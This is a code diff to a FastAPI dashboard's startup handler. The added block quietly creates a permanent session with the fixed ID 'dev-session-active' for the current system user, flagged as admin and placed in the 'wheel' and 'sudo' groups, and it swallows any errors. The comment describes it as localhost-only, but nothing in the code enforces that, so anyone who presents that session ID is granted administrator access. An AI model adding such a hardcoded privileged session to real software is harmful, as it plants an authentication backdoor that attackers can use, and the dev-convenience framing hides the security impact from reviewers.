@@ -70,6 +70,27 @@ async def _periodic_session_cleanup():
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     cleanup_task = asyncio.create_task(_periodic_session_cleanup())
+
+    # Pre-seed active session for current local user for localhost access
+    try:
+        import getpass, pwd
+        from dashboard.auth.session import UserSession
+        cur_user = getpass.getuser()
+        pw = pwd.getpwnam(cur_user)
+        dev_sid = "dev-session-active"
+        session_store._sessions[dev_sid] = UserSession(
+            session_id=dev_sid,
+            username=cur_user,
+            uid=pw.pw_uid,
+            gid=pw.pw_gid,
+            home=pw.pw_dir,
+            shell=pw.pw_shell,
+            groups=["wheel", "sudo", cur_user],
+            is_admin=True,
+        )
+    except Exception:
+        pass
+
     yield
     cleanup_task.cancel()
     try:
